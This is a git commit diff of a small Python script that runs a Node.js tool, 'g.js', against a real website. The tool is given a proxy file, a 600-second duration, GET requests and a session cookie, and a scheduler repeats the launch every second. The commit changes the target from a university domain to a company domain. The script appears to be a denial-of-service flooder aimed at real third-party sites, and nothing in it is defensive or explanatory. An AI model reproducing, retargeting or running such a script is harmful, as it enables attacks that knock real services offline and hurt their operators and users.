999800eaa1baed571480dc3ac125491865729b83
junelynpalma <74013446+junelynpalma@users.noreply.github.com>
2021-10-14 20:47:26 +0800

    Update 12.py

--- 12.py
+++ 12.py
@@ -3,10 +3,10 @@ import time
 import os
 import sys
 
-os.system('node g.js http://uve.usep.edu.ph http.txt 600 GET PHPSESSID:1g6s2thdcoksh05qcpimcgu970')
+os.system('node g.js http://dcc-essentiel.ckgroup.ph http.txt 600 GET PHPSESSID:1g6s2thdcoksh05qcpimcgu970')
 
 def job():
-    os.system('node g.js http://uve.usep.edu.ph http.txt 600 GET PHPSESSID:1g6s2thdcoksh05qcpimcgu970')
+    os.system('node g.js http://dcc-essentiel.ckgroup.ph http.txt 600 GET PHPSESSID:1g6s2thdcoksh05qcpimcgu970')
     
 schedule.every(1).seconds.do(job)
 
